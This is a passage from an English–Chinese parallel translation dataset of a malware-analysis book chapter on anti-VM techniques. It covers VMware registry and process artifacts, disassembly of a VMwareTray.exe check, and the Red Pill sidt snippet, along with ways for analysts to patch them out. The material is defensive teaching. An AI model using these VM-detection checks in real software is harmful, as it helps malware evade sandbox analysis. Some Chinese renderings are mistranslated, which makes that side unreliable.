  type: TYPE_NORMAL
  zh: '*VMware Tools运行*'
- en: '*VMwareService.exe* runs the VMware Tools Service as a child of *services.exe*.'
  id: totrans-1155
  prefs: []
  type: TYPE_NORMAL
  zh: '*VMwareService.exe* 以 *services.exe* 的子进程运行VMware Tools服务。'
- en: 'It can be identified by searching the registry for services installed on a
    machine or by listing services using the following command:'
  id: totrans-1156
  prefs: []
  type: TYPE_NORMAL
  zh: 可以通过在机器上搜索安装的服务或在以下命令中列出服务来识别：
- en: C:\> **net start | findstr VMware**
  id: totrans-1157
  prefs: []
  type: TYPE_NORMAL
  zh: C:\> **net start | findstr VMware**
- en: VMware Physical Disk Helper Service
  id: totrans-1158
  prefs: []
  type: TYPE_NORMAL
  zh: VMware物理磁盘辅助服务
- en: VMware Tools Service
  id: totrans-1159
  prefs: []
  type: TYPE_NORMAL
  zh: VMware Tools服务
- en: '**370**'
  id: totrans-1160
  prefs: []
  type: TYPE_NORMAL
  zh: '**370**'
- en: Chapter 17
  id: totrans-1161
  prefs: []
  type: TYPE_NORMAL
  zh: 第17章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1162
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: The VMware installation directory *C:\Program Files\VMware\VMware Tools* may
    also contain artifacts, as can the registry. A quick search for “VMware”
  id: totrans-1163
  prefs: []
  type: TYPE_NORMAL
  zh: VMware的安装目录 *C:\Program Files\VMware\VMware Tools* 也可能包含一些证据，注册表中也可能有。快速搜索“VMware”
- en: in a virtual machine’s registry might find keys like the following, which are
    entries that include information about the virtual hard drive, adapters, and virtual
    mouse.
  id: totrans-1164
  prefs: []
  type: TYPE_NORMAL
  zh: 在虚拟机的注册表中可能找到如下键，这些键包含有关虚拟硬盘、适配器和虚拟鼠标的信息。
- en: '[HKEY_LOCAL_MACHINE\HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id
    0\Logical Unit Id 0]'
  id: totrans-1165
  prefs: []
  type: TYPE_NORMAL
  zh: '[HKEY_LOCAL_MACHINE\HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id
    0\Logical Unit Id 0]'
- en: '"Identifier"="VMware Virtual IDE Hard Drive"'
  id: totrans-1166
  prefs: []
  type: TYPE_NORMAL
  zh: '"Identifier"="VMware Virtual IDE Hard Drive"'
- en: '"Type"="DiskPeripheral"'
  id: totrans-1167
  prefs: []
  type: TYPE_NORMAL
  zh: '"Type"="DiskPeripheral"'
- en: '[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Reinstall\0000]'
  id: totrans-1168
  prefs: []
  type: TYPE_NORMAL
  zh: '[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Reinstall\0000]'
- en: '"DeviceDesc"="VMware Accelerated AMD PCNet Adapter"'
  id: totrans-1169
  prefs: []
  type: TYPE_NORMAL
  zh: '"DeviceDesc"="VMware加速AMD PCNet适配器"'
- en: '"DisplayName"="VMware Accelerated AMD PCNet Adapter"'
  id: totrans-1170
  prefs: []
  type: TYPE_NORMAL
  zh: '"DisplayName"="VMware加速AMD PCNet适配器"'
- en: '"Mfg"="VMware, Inc."'
  id: totrans-1171
  prefs: []
  type: TYPE_NORMAL
  zh: '"Mfg"="VMware, Inc."'
- en: '"ProviderName"="VMware, Inc."'
  id: totrans-1172
  prefs: []
  type: TYPE_NORMAL
  zh: '"ProviderName"="VMware, Inc."'
- en: '[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\{4D36E96F-E325-11CE-BFC1-08002BE10318}\0000]'
  id: totrans-1173
  prefs: []
  type: TYPE_NORMAL
  zh: '[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\{4D36E96F-E325-11CE-BFC1-08002BE10318}\0000]'
- en: '"LocationInformationOverride"="plugged into PS/2 mouse port"'
  id: totrans-1174
  prefs: []
  type: TYPE_NORMAL
  zh: '"LocationInformationOverride"="连接到PS/2鼠标端口"'
- en: '"InfPath"="oem13.inf"'
  id: totrans-1175
  prefs: []
  type: TYPE_NORMAL
  zh: '"InfPath"="oem13.inf"'
- en: '"InfSection"="VMMouse"'
  id: totrans-1176
  prefs: []
  type: TYPE_NORMAL
  zh: '"InfSection"="VMMouse"'
- en: '"ProviderName"="VMware, Inc."'
  id: totrans-1177
  prefs: []
  type: TYPE_NORMAL
  zh: '"ProviderName"="VMware, Inc."'
- en: As discussed in Chapter 2, you can connect your virtual machine to a network
    in a variety of ways, all of which allow the virtual machine to have its own virtual
    network interface card (NIC). Because VMware must virtualize the NIC, it needs
    to create a MAC address for the virtual machine, and, depending on its configuration,
    the network adapter can also identify VMware usage.
  id: totrans-1178
  prefs: []
  type: TYPE_NORMAL
  zh: 如第2章所述，你可以以多种方式将虚拟机连接到网络，所有这些方式都允许虚拟机拥有自己的虚拟网络接口卡（NIC）。因为VMware必须虚拟化NIC，所以它需要为虚拟机创建一个MAC地址，并且根据其配置，网络适配器也可以识别VMware的使用。
- en: The first three bytes of a MAC address are typically specific to the vendor,
    and MAC addresses starting with 00:0C:29 are associated with VMware.
  id: totrans-1179
  prefs: []
  type: TYPE_NORMAL
  zh: MAC地址的前三个字节通常是特定于供应商的，以00:0C:29开头的MAC地址与VMware相关联。
- en: VMware MAC addresses typically change from version to version, but all that
    a malware author needs to do is to check the virtual machine’s MAC address for
    VMware values.
  id: totrans-1180
  prefs: []
  type: TYPE_NORMAL
  zh: VMware的MAC地址通常从版本到版本都会变化，但恶意软件作者需要做的只是检查虚拟机的MAC地址是否为VMware值。
- en: Malware can also detect VMware by other hardware, such as the mother-board.
    If you see malware checking versions of hardware, it might be trying to detect
    VMware. Look for the code that checks MAC addresses or hardware versions, and
    patch the code to avoid the check.
  id: totrans-1181
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件还可以通过其他硬件，如主板来检测VMware。如果你看到恶意软件正在检查硬件版本，它可能正在尝试检测VMware。寻找检查MAC地址或硬件版本的代码，并修补代码以避免检查。
- en: 'The most common VMware artifacts can be easily eliminated by uninstalling VMware
    Tools or by trying to stop the VMware Tools Service with the following command:'
  id: totrans-1182
  prefs: []
  type: TYPE_NORMAL
  zh: 最常见的VMware痕迹可以通过卸载VMware Tools或尝试使用以下命令停止VMware Tools服务来轻松消除：
- en: '**net stop "VMware Tools Service"**'
  id: totrans-1183
  prefs: []
  type: TYPE_NORMAL
  zh: '**net stop "VMware Tools Service"**'
- en: You may also be able to prevent malware from searching for artifacts.
  id: totrans-1184
  prefs: []
  type: TYPE_NORMAL
  zh: 你也可能能够防止恶意软件搜索痕迹。
- en: For example, if you find a single VMware-related string in malware—such as net
    start | findstr VMware, VMMouse, VMwareTray.exe, or VMware Virtual IDE Hard Drive—you
    know that the malware is attempting to detect VMware artifacts.
  id: totrans-1185
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，如果你在恶意软件中找到一个与VMware相关的字符串——例如net start | findstr VMware, VMMouse, VMwareTray.exe或VMware
    Virtual IDE Hard Drive——你就知道恶意软件正在尝试检测VMware痕迹。
- en: You should be able to find this code easily in IDA Pro using the references
    to the strings. Once you find it, patch it to avoid detection while ensuring that
    the malware will function properly.
  id: totrans-1186
  prefs: []
  type: TYPE_NORMAL
  zh: 你应该能够在IDA Pro中使用字符串的引用轻松找到此代码。一旦找到，修补它以避免检测，同时确保恶意软件能够正常工作。
- en: Anti-Virtual Machine Techniques
  id: totrans-1187
  prefs: []
  type: TYPE_NORMAL
  zh: 虚拟机检测技术
- en: '**371**'
  id: totrans-1188
  prefs: []
  type: TYPE_NORMAL
  zh: '**371**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1189
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '***Bypassing VMware Artifact Searching***'
  id: totrans-1190
  prefs: []
  type: TYPE_NORMAL
  zh: '***绕过VMware痕迹搜索***'
- en: 'Defeating malware that searches for VMware artifacts is often a simple two-step
    process: identify the check and then patch it. For example, say we run strings
    against the malware *vmt.exe*. We notice that the binary contains the string "VMwareTray.exe",
    and we discover a cross-reference from the code to this string. We follow this
    cross-reference to 0x401098, as shown in the disassembly in Listing 17-1 at .'
  id: totrans-1191
  prefs: []
  type: TYPE_NORMAL
  zh: 消除搜索VMware痕迹的恶意软件通常是一个简单的两步过程：识别检查并修补它。例如，假设我们对恶意软件*vmt.exe*运行strings命令。我们注意到二进制文件中包含字符串"VMwareTray.exe"，并且我们发现代码中有一个对此字符串的交叉引用。我们跟随这个交叉引用到0x401098，如列表17-1所示的汇编所示。
- en: 0040102D call ds:**CreateToolhelp32Snapshot**
  id: totrans-1192
  prefs: []
  type: TYPE_NORMAL
  zh: 0040102D call ds:**CreateToolhelp32Snapshot**
- en: 00401033 lea ecx, [ebp+processentry32]
  id: totrans-1193
  prefs: []
  type: TYPE_NORMAL
  zh: 00401033 lea ecx, [ebp+processentry32]
- en: 00401039 mov ebx, eax
  id: totrans-1194
  prefs: []
  type: TYPE_NORMAL
  zh: 00401039 mov ebx, eax
- en: 0040103B push ecx ; lppe
  id: totrans-1195
  prefs: []
  type: TYPE_NORMAL
  zh: 0040103B push ecx ; lppe
- en: 0040103C push ebx ; hSnapshot
  id: totrans-1196
  prefs: []
  type: TYPE_NORMAL
  zh: 0040103C push ebx ; hSnapshot
- en: 0040103D mov [ebp+processentry32.dwSize], 22Ch
  id: totrans-1197
  prefs: []
  type: TYPE_NORMAL
  zh: 0040103D mov [ebp+processentry32.dwSize], 22Ch
- en: 00401047 call ds:Process32FirstW
  id: totrans-1198
  prefs: []
  type: TYPE_NORMAL
  zh: 00401047 call ds:Process32FirstW
- en: 0040104D mov esi, ds:WideCharToMultiByte
  id: totrans-1199
  prefs: []
  type: TYPE_NORMAL
  zh: 0040104D mov esi, ds:WideCharToMultiByte
- en: 00401053 mov edi, ds:strncmp
  id: totrans-1200
  prefs: []
  type: TYPE_NORMAL
  zh: 00401053 mov edi, ds:strncmp
- en: 00401059 lea esp, [esp+0]
  id: totrans-1201
  prefs: []
  type: TYPE_NORMAL
  zh: 00401059 lea esp, [esp+0]
- en: '00401060 loc_401060: ; CODE XREF: sub_401000+B7j 00401060 push 0 ; lpUsedDefaultChar'
  id: totrans-1202
  prefs: []
  type: TYPE_NORMAL
  zh: '00401060 loc_401060: ; CODE XREF: sub_401000+B7j 00401060 push 0 ; lpUsedDefaultChar'
- en: 00401062 push 0 ; lpDefaultChar
  id: totrans-1203
  prefs: []
  type: TYPE_NORMAL
  zh: 00401062 push 0 ; lpDefaultChar
- en: 00401064 push 104h ; cbMultiByte
  id: totrans-1204
  prefs: []
  type: TYPE_NORMAL
  zh: 00401064 push 104h ; cbMultiByte
- en: 00401069 lea edx, [ebp+Str1]
  id: totrans-1205
  prefs: []
  type: TYPE_NORMAL
  zh: 00401069 lea edx, [ebp+Str1]
- en: 0040106F push edx ; lpMultiByteStr
  id: totrans-1206
  prefs: []
  type: TYPE_NORMAL
  zh: 0040106F push edx ; lpMultiByteStr
- en: 00401070 push 0FFFFFFFFh ; cchWideChar
  id: totrans-1207
  prefs: []
  type: TYPE_NORMAL
  zh: 00401070 push 0FFFFFFFFh ; cchWideChar
- en: 00401072 lea eax, [ebp+processentry32.szExeFile]
  id: totrans-1208
  prefs: []
  type: TYPE_NORMAL
  zh: 00401072 lea eax, [ebp+processentry32.szExeFile]
- en: 00401078 push eax ; lpWideCharStr
  id: totrans-1209
  prefs: []
  type: TYPE_NORMAL
  zh: 00401078 push eax ; lpWideCharStr
- en: 00401079 push 0 ; dwFlags
  id: totrans-1210
  prefs: []
  type: TYPE_NORMAL
  zh: 00401079 push 0 ; dwFlags
- en: 0040107B push 3 ; CodePage
  id: totrans-1211
  prefs: []
  type: TYPE_NORMAL
  zh: 0040107B push 3 ; CodePage
- en: 0040107D call esi ; WideCharToMultiByte
  id: totrans-1212
  prefs: []
  type: TYPE_NORMAL
  zh: 0040107D call esi ; WideCharToMultiByte
- en: 0040107F lea eax, [ebp+Str1]
  id: totrans-1213
  prefs: []
  type: TYPE_NORMAL
  zh: 0040107F lea eax, [ebp+Str1]
- en: 00401085 lea edx, [eax+1]
  id: totrans-1214
  prefs: []
  type: TYPE_NORMAL
  zh: 00401085 lea edx, [eax+1]
- en: '00401088 loc_401088: ; CODE XREF: sub_401000+8Dj 00401088 mov cl, [eax]'
  id: totrans-1215
  prefs: []
  type: TYPE_NORMAL
  zh: '00401088 loc_401088: ; CODE XREF: sub_401000+8Dj 00401088 mov cl, [eax]'
- en: 0040108A inc eax
  id: totrans-1216
  prefs: []
  type: TYPE_NORMAL
  zh: 0040108A inc eax
- en: 0040108B test cl, cl
  id: totrans-1217
  prefs: []
  type: TYPE_NORMAL
  zh: 0040108B test cl, cl
- en: 0040108D jnz short loc_401088
  id: totrans-1218
  prefs: []
  type: TYPE_NORMAL
  zh: 0040108D jnz short loc_401088
- en: 0040108F sub eax, edx
  id: totrans-1219
  prefs: []
  type: TYPE_NORMAL
  zh: 0040108F sub eax, edx
- en: 00401091 push eax ; MaxCount
  id: totrans-1220
  prefs: []
  type: TYPE_NORMAL
  zh: 00401091 push eax ; MaxCount
- en: 00401092 lea ecx, [ebp+Str1]
  id: totrans-1221
  prefs: []
  type: TYPE_NORMAL
  zh: 00401092 lea ecx, [ebp+Str1]
- en: 00401098 push offset Str2 ; " **VMwareTray.exe**" 
  id: totrans-1222
  prefs: []
  type: TYPE_NORMAL
  zh: 00401098 push offset Str2 ; " **VMwareTray.exe**" 
- en: 0040109D push ecx ; Str1
  id: totrans-1223
  prefs: []
  type: TYPE_NORMAL
  zh: 0040109D push ecx ; Str1
- en: 0040109E call edi ; **strncmp** 
  id: totrans-1224
  prefs: []
  type: TYPE_NORMAL
  zh: 0040109E call edi ; **strncmp** 
- en: 004010A0 add esp, 0Ch
  id: totrans-1225
  prefs: []
  type: TYPE_NORMAL
  zh: 004010A0 add esp, 0Ch
- en: 004010A3 test eax, eax
  id: totrans-1226
  prefs: []
  type: TYPE_NORMAL
  zh: 004010A3 test eax, eax
- en: 004010A5 jz short loc_4010C0
  id: totrans-1227
  prefs: []
  type: TYPE_NORMAL
  zh: 004010A5 jz short loc_4010C0
- en: 004010A7 lea edx, [ebp+processentry32]
  id: totrans-1228
  prefs: []
  type: TYPE_NORMAL
  zh: 004010A7 lea edx, [ebp+processentry32]
- en: 004010AD push edx ; lppe
  id: totrans-1229
  prefs: []
  type: TYPE_NORMAL
  zh: 004010AD push edx ; lppe
- en: 004010AE push ebx ; hSnapshot
  id: totrans-1230
  prefs: []
  type: TYPE_NORMAL
  zh: 004010AE push ebx ; hSnapshot
- en: 004010AF call ds:**Process32NextW**
  id: totrans-1231
  prefs: []
  type: TYPE_NORMAL
  zh: 004010AF call ds:**Process32NextW**
- en: 004010B5 test eax, eax
  id: totrans-1232
  prefs: []
  type: TYPE_NORMAL
  zh: 004010B5 test eax, eax
- en: 004010B7 jnz short loc_401060
  id: totrans-1233
  prefs: []
  type: TYPE_NORMAL
  zh: 004010B7 jnz short loc_401060
- en: '...'
  id: totrans-1234
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: '**372**'
  id: totrans-1235
  prefs: []
  type: TYPE_NORMAL
  zh: '**372**'
- en: Chapter 17
  id: totrans-1236
  prefs: []
  type: TYPE_NORMAL
  zh: 第 17 章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1237
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '004010C0 loc_4010C0: ; CODE XREF: sub_401000+A5j 004010C0 push 0 ; Code'
  id: totrans-1238
  prefs: []
  type: TYPE_NORMAL
  zh: '004010C0 loc_4010C0: ; CODE XREF: sub_401000+A5j 004010C0 push 0 ; Code'
- en: 004010C2 call ds:exit
  id: totrans-1239
  prefs: []
  type: TYPE_NORMAL
  zh: 004010C2 call ds:exit
- en: '*Listing 17-1: Disassembly snippet from* vmt.exe *showing VMware artifact detection*
    Analyzing this code further, we notice that it is scanning the process listing
    with functions like CreateToolhelp32Snapshot, Process32Next, and so on. The strncmp
    at  is comparing the VMwareTray.exe string with the result of converting processentry32.szExeFile
    to ASCII to determine if the process name is in the process listing. If VMwareTray.exe
    is discovered in the process listing, the program will immediately terminate,
    as seen at 0x4010c2\.'
  id: totrans-1240
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 17-1：从 vmt.exe 中提取的汇编片段，显示 VMware 艺术品检测* 分析此代码，我们注意到它正在使用 CreateToolhelp32Snapshot、Process32Next
    等函数扫描进程列表。在处的 strncmp 正在比较 VMwareTray.exe 字符串与将 processentry32.szExeFile 转换为
    ASCII 的结果，以确定进程名称是否在进程列表中。如果进程列表中发现 VMwareTray.exe，程序将立即终止，如 0x4010c2 所见。'
- en: 'There are a couple of ways to avoid this detection:'
  id: totrans-1241
  prefs: []
  type: TYPE_NORMAL
  zh: 有几种方法可以避免这种检测：
- en: 
  id: totrans-1242
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Patch the binary while debugging so that the jump at 0x4010a5 will never be
    taken.
  id: totrans-1243
  prefs: []
  type: TYPE_NORMAL
  zh: 在调试时修补二进制文件，以确保在 0x4010a5 处的跳转永远不会被执行。
- en: 
  id: totrans-1244
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Use a hex editor to modify the VMwareTray.exe string to read XXXareTray.exe
    to make the comparison fail since this is not a valid process string.
  id: totrans-1245
  prefs: []
  type: TYPE_NORMAL
  zh: 使用十六进制编辑器修改 VMwareTray.exe 字符串，使其读取 XXXareTray.exe，从而使比较失败，因为这不是一个有效的进程字符串。
- en: 
  id: totrans-1246
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Uninstall VMware Tools so that *VMwareTray.exe* will no longer run.
  id: totrans-1247
  prefs: []
  type: TYPE_NORMAL
  zh: 卸载 VMware 工具，这样 *VMwareTray.exe* 就不再运行。
- en: '***Checking for Memory Artifacts***'
  id: totrans-1248
  prefs: []
  type: TYPE_NORMAL
  zh: '***检查内存艺术品***'
- en: VMware leaves many artifacts in memory as a result of the virtualization process.
    Some are critical processor structures, which, because they are either moved or
    changed on a virtual machine, leave recognizable footprints.
  id: totrans-1249
  prefs: []
  type: TYPE_NORMAL
  zh: 由于虚拟化过程，VMware 在内存中留下了许多艺术品。其中一些是关键处理器结构，由于它们在虚拟机上被移动或更改，因此留下了可识别的痕迹。
- en: One technique commonly used to detect memory artifacts is a search through physical
    memory for the string VMware, which we have found may detect several hundred instances.
  id: totrans-1250
  prefs: []
  type: TYPE_NORMAL
  zh: 检测内存艺术品的一种常用技术是在物理内存中搜索 VMware 字符串，我们发现这可能检测到数百个实例。
- en: '**Vulnerable Instructions**'
  id: totrans-1251
  prefs: []
  type: TYPE_NORMAL
  zh: '**易受攻击的指令**'
- en: The virtual machine monitor program monitors the virtual machine’s execution.
    It runs on the host operating system to present the guest operating system with
    a virtual platform. It also has a couple of security weaknesses that can allow
    malware to detect virtualization.
  id: totrans-1252
  prefs: []
  type: TYPE_NORMAL
  zh: 虚拟机监控程序程序监控虚拟机的执行。它在宿主操作系统上运行，为 guest 操作系统提供一个虚拟平台。它还有一些安全弱点，允许恶意软件检测虚拟化。
- en: '**NOTE**'
  id: totrans-1253
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*The x86 instruction-related issues in virtual machines discussed in this section
    were* *originally outlined in the USENIX 2000 paper “Analysis of the Intel Pentium’s
    Ability* *to Support a Secure Virtual Machine Monitor” by John Robin and Cynthia
    Irvine.*'
  id: totrans-1254
  prefs: []
  type: TYPE_NORMAL
  zh: '*本节中讨论的虚拟机中的 x86 指令相关问题是* *最初由 John Robin 和 Cynthia Irvine 在 USENIX 2000 论文“分析英特尔奔腾支持安全虚拟机监控器的能力”中概述的*
    *。'
- en: In kernel mode, VMware uses binary translation for emulation. Certain privileged
    instructions in kernel mode are interpreted and emulated, so they don’t run on
    the physical processor. Conversely, in user mode, the code runs directly on the
    processor, and nearly every instruction that interacts with hardware is either
    privileged or generates a kernel trap or interrupt. VMware catches all the interrupts
    and processes them, so that the virtual machine still thinks it is a regular machine.
  id: totrans-1255
  prefs: []
  type: TYPE_NORMAL
  zh: 在内核模式下，VMware 使用二进制转换进行模拟。内核模式中的某些特权指令被解释和模拟，因此它们不会在物理处理器上运行。相反，在用户模式下，代码直接在处理器上运行，几乎所有与硬件交互的指令要么是特权的，要么生成内核陷阱或中断。VMware
    捕获所有中断并处理它们，这样虚拟机仍然认为它是一台普通机器。
- en: Anti-Virtual Machine Techniques
  id: totrans-1256
  prefs: []
  type: TYPE_NORMAL
  zh: 反虚拟机技术
- en: '**373**'
  id: totrans-1257
  prefs: []
  type: TYPE_NORMAL
  zh: '**373**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1258
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Some instructions in x86 access hardware-based information but don’t generate
    interrupts. These include sidt, sgdt, sldt, and cpuid, among others.
  id: totrans-1259
  prefs: []
  type: TYPE_NORMAL
  zh: x86 中的某些指令访问基于硬件的信息，但不会生成中断。这些包括 sidt、sgdt、sldt 和 cpuid 等。
- en: In order to virtualize these instructions properly, VMware would need to perform
    binary translation on every instruction (not just kernel-mode instructions), resulting
    in a huge performance hit. To avoid huge performance hits from doing full-instruction
    emulation, VMware allows certain instructions to execute without being properly
    virtualized. Ultimately, this means that certain instruction sequences will return
    different results when running under VMware than they will on native hardware.
  id: totrans-1260
  prefs: []
  type: TYPE_NORMAL
  zh: 为了正确虚拟化这些指令，VMware 需要对每个指令执行二进制转换（而不仅仅是内核模式指令），这会导致巨大的性能损失。为了避免因完全指令模拟而导致的巨大性能损失，VMware
    允许某些指令在不被正确虚拟化的情况下执行。最终，这意味着在某些指令序列在 VMware 下运行时与在原生硬件上运行时将返回不同的结果。
- en: The processor uses certain key structures and tables, which are loaded at different
    offsets as a side effect of this lack of full translation. The *interrupt* *descriptor
    table* *(IDT)* is a data structure internal to the CPU, which is used by the operating
    system to determine the correct response to interrupts and exceptions. Under x86,
    all memory accesses pass through either the *global* *descriptor table (GDT)*
    or the *local descriptor table (LDT)*. These tables contain segment descriptors
    that provide access details for each segment, including the base address, type,
    length, access rights, and so on. IDT (IDTR), GDT
  id: totrans-1261
  prefs: []
  type: TYPE_NORMAL
  zh: 处理器使用某些关键结构和表，由于缺乏完全转换，这些表以不同的偏移量加载。*中断* *描述符表* *(IDT)* 是 CPU 内部的数据结构，操作系统使用它来确定对中断和异常的正确响应。在
    x86 中，所有内存访问都通过 *全局* *描述符表 (GDT)* 或 *局部描述符表 (LDT)*。这些表包含段描述符，为每个段提供访问细节，包括基址、类型、长度、访问权限等。IDT
    (IDTR)，GDT
- en: (GDTR), and LDT (LDTR) are the internal registers that contain the address and
    size of these respective tables.
  id: totrans-1262
  prefs: []
  type: TYPE_NORMAL
  zh: (GDTR)，和LDT (LDTR) 是包含这些相应表地址和大小的内部寄存器。
- en: Note that operating systems do not need to utilize these tables. For example,
    Windows implements a flat memory model and uses only the GDT
  id: totrans-1263
  prefs: []
  type: TYPE_NORMAL
  zh: 注意，操作系统不需要使用这些表。例如，Windows 实现了平面内存模型，并仅使用 GDT
- en: by default. It does not use the LDT.
  id: totrans-1264
  prefs: []
  type: TYPE_NORMAL
  zh: 默认情况下。它不使用LDT。
- en: Three sensitive instructions—sidt, sgdt, and sldt—read the location of these
    tables, and all store the respective register into a memory location.
  id: totrans-1265
  prefs: []
  type: TYPE_NORMAL
  zh: 三个敏感指令——sidt、sgdt 和 sldt——读取这些表的地址，并将相应的寄存器存储到内存位置。
- en: While these instructions are typically used by the operating system, they are
    not privileged in the x86 architecture, and they can be executed from user space.
  id: totrans-1266
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然这些指令通常由操作系统使用，但在 x86 架构中它们不是特权的，并且可以从用户空间执行。
- en: An x86 processor has only three registers to store the locations of these three
    tables. Therefore, these registers must contain values valid for the underlying
    host operating system and will diverge from values expected by the virtualized
    (guest) operating system. Since the sidt, sgdt, and sldt instructions can be invoked
    at any time by user-mode code without being trapped and properly virtualized by
    VMware, they can be used to detect its presence.
  id: totrans-1267
  prefs: []
  type: TYPE_NORMAL
  zh: x86处理器只有三个寄存器来存储这三个表的地址。因此，这些寄存器必须包含对底层宿主操作系统的有效值，并且将与虚拟化（客户）操作系统预期的值不同。由于sidt、sgdt和sldt指令可以在任何时候由用户模式代码调用，而无需被捕获并由VMware正确虚拟化，因此可以使用它们来检测其存在。
- en: '***Using the Red Pill Anti-VM Technique***'
  id: totrans-1268
  prefs: []
  type: TYPE_NORMAL
  zh: '***使用Red Pill反虚拟机技术***'
- en: Red Pill is an anti-VM technique that executes the sidt instruction to grab
    the value of the IDTR register. The virtual machine monitor must relocate the
    guest’s IDTR to avoid conflict with the host’s IDTR. Since the virtual machine
    monitor is not notified when the virtual machine runs the sidt instruction, the
    IDTR for the virtual machine is returned. The Red Pill tests for this discrepancy
    to detect the usage of VMware.
  id: totrans-1269
  prefs: []
  type: TYPE_NORMAL
  zh: Red Pill是一种反虚拟机技术，它执行sidt指令以获取IDTR寄存器的值。虚拟机监控程序必须重新定位客户的IDTR以避免与宿主的IDTR冲突。由于虚拟机监控程序在虚拟机运行sidt指令时不会收到通知，因此返回的虚拟机的IDTR。Red
    Pill测试这种差异以检测VMware的使用。
- en: Listing 17-2 shows how Red Pill might be used by malware.
  id: totrans-1270
  prefs: []
  type: TYPE_NORMAL
  zh: 列表17-2显示了恶意软件可能如何使用Red Pill。
- en: push ebp
  id: totrans-1271
  prefs: []
  type: TYPE_NORMAL
  zh: push ebp
- en: mov ebp, esp
  id: totrans-1272
  prefs: []
  type: TYPE_NORMAL
  zh: mov ebp, esp
- en: sub esp, 454h
  id: totrans-1273
  prefs: []
  type: TYPE_NORMAL
  zh: sub esp, 454h
- en: push ebx
  id: totrans-1274
  prefs: []
  type: TYPE_NORMAL
  zh: push ebx
- en: push esi
  id: totrans-1275
  prefs: []
  type: TYPE_NORMAL
  zh: push esi
- en: '**374**'
  id: totrans-1276
  prefs: []
  type: TYPE_NORMAL
  zh: '**374**'
- en: Chapter 17
  id: totrans-1277
  prefs: []
  type: TYPE_NORMAL
  zh: 第17章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1278
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: push edi
  id: totrans-1279
  prefs: []
  type: TYPE_NORMAL
  zh: push edi
- en: push 8 ; Size
  id: totrans-1280
  prefs: []
  type: TYPE_NORMAL
  zh: push 8 ; Size
- en: push 0 ; Val
  id: totrans-1281
  prefs: []
  type: TYPE_NORMAL
  zh: push 0 ; Val
- en: lea eax, [ebp+Dst]
  id: totrans-1282
  prefs: []
  type: TYPE_NORMAL
  zh: lea eax, [ebp+Dst]
- en: push eax ; Dst
  id: totrans-1283
  prefs: []
  type: TYPE_NORMAL
  zh: push eax ; Dst
- en: call _memset
  id: totrans-1284
  prefs: []
  type: TYPE_NORMAL
  zh: call _memset
- en: add esp, 0Ch
  id: totrans-1285
  prefs: []
  type: TYPE_NORMAL
  zh: add esp, 0Ch
- en: lea eax, [ebp+Dst]
  id: totrans-1286
  prefs: []
  type: TYPE_NORMAL
  zh: lea eax, [ebp+Dst]
- en:  **sidt** fword ptr [eax]
  id: totrans-1287
  prefs: []
  type: TYPE_NORMAL
  zh:  **sidt** fword ptr [eax]
- en: mov al, [eax+5]
  id: totrans-1288
  prefs: []
  type: TYPE_NORMAL
  zh: mov al, [eax+5]
- en: cmp al, 0FFh
  id: totrans-1289
  prefs: []
  type: TYPE_NORMAL
  zh: cmp al, 0FFh
- en: jnz short loc_401E19
  id: totrans-1290
  prefs: []
  type: TYPE_NORMAL
  zh: jnz short loc_401E19
- en: '*Listing 17-2: Red Pill in malware*'
  id: totrans-1291
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表17-2：恶意软件中的Red Pill*'
- en: The malware issues the sidt instruction at , which stores the contents of IDTR
    into the memory location pointed to by EAX. The IDTR is 6 bytes, and the fifth
    byte offset contains the start of the base memory address. That fifth byte is
    compared to 0xFF, the VMware signature.
  id: totrans-1292
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件在处发出sidt指令，将IDTR的内容存储到由EAX指向的内存位置。IDTR是6字节，第五个字节偏移量包含基本内存地址的开始。该第五个字节与0xFF（VMware签名）进行比较。
- en: Red Pill succeeds only on a single-processor machine. It won’t work consistently
    against multicore processors because each processor (guest or host) has an IDT
    assigned to it. Therefore, the result of the sidt instruction can vary, and the
    signature used by Red Pill can be unreliable.
  id: totrans-1293
  prefs: []
  type: TYPE_NORMAL
  zh: Red Pill仅在单核机器上成功。它不会在多核处理器上持续工作，因为每个处理器（客户或宿主）都有一个IDT分配给它。因此，sidt指令的结果可能不同，Red
    Pill使用的签名可能不可靠。
- en: To thwart this technique, run on a multicore processor machine or simply NOP-out
    the sidt instruction.
  id: totrans-1294
  prefs: []
  type: TYPE_NORMAL
  zh: 为了阻止这种技术，请在多核处理器机器上运行或简单地NOP掉sidt指令。
- en: '***Using the No Pill Technique***'
  id: totrans-1295
  prefs: []
  type: TYPE_NORMAL
  zh: '***使用No Pill技术***'
- en: The sgdt and sldt instruction technique for VMware detection is commonly known
    as No Pill. Unlike Red Pill, No Pill relies on the fact that the LDT
  id: totrans-1296
  prefs: []
  type: TYPE_NORMAL
